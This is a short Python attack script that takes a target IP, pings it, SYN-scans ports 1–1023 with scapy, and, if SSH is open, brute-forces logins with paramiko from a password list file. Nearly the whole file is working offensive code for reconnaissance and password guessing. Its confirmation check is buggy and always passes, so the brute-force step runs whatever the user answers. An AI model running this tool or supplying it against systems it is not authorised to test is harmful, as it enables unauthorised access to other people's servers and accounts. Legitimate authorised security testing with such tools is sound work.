import paramiko
from scapy.all import *

target = str(input("Enter IP to attack: "))
Registered_Ports = range(1, 1024)
open_ports = []
status = False

def scanport(port):
	conf.verb = 0
	sport = RandShort()
	global status
	global open_ports
	try:
		SynPkt = sr1(IP(dst=target)/TCP(sport=sport, dport=port, flags="S"), timeout=0.5)
		if SynPkt != None:
			if SynPkt.haslayer(TCP):
				if SynPkt.getlayer(TCP).flags == 0x12:
					print(port, ": Open")
					status = True
					open_ports.append(port)
				else:
					return False
		else:
			print(port, ": Closed")
			return False
		sr(IP(dst=target) / TCP(sport=sport, dport=port, flags="R"), timeout=2)
		return True
	except Exception as e:
		print("The error was :", e)
		return False

def icmp():
	try:
		conf.verb = 0
		IcmpPkt = sr1(IP(dst=target) / ICMP(), timeout=3)
		if IcmpPkt != None:
			if IcmpPkt.haslayer(ICMP):
				print(target, " ICMP ok")
				return True
		else:
			print(target, " unreachable")
	except Exception as e:
		print("The error was :", e)

def loop():
	for port in Registered_Ports:
		scanport(port)
	print("Scan finished, open ports: ", open_ports)

def bruteforce(port):
	user = str(input("Enter username: "))
	SSHconn = paramiko.SSHClient()
	SSHconn.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	try:
		with open('PasswordList.txt') as file:
			passwords = file.read().splitlines()
			for password in passwords:
				if password != None:
					try:
						SSHconn.connect(target, port=port, username=user, password=password, timeout=1)
						print("Success, logged with password: ", password)
						SSHconn.close()
						break
					except:
						print(password, " failed")
					continue
	except Exception as e:
		print("ERROR: ", e)

def main():
	if icmp():
		loop()
	if open_ports.__contains__(22):
		answear = str(input("Do you want to bruteforce SSH? y/n? "))
		if answear == "y" or "Y":
			bruteforce(22)

if __name__ == "__main__":
	main()